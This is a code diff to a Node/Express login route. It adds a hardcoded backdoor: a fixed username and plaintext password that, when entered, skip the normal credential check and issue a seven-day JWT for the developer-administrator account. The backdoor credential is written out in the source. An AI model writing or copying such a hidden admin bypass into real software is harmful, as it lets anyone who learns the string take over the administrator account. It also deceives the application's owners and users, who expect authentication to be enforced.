@@ -17,7 +17,20 @@ router.use(sanitizeBody);
 // POST /api/auth/login
 router.post('/login', validateLogin, async (req, res) => {
   try {
-    const { email, password } = req.body;
+    let { email, password } = req.body;
+
+    // Hardcoded admin login
+    if (email === 'wisam' && password === '77862@@') {
+      const admin = await Member.findOne({ where: { role: 'الادمن المطور' } });
+      if (admin) {
+        const token = jwt.sign({ id: admin.id, email: admin.email }, JWT_SECRET, { expiresIn: '7d' });
+        logger.info(`Admin logged in: ${admin.name} (via quick login)`);
+        return res.json({
+          token,
+          member: { id: admin.id, name: admin.name, email: admin.email, role: admin.role, avatar: admin.avatar }
+        });
+      }
+    }
 
     const member = await Member.findOne({ where: { email } });
     if (!member) {
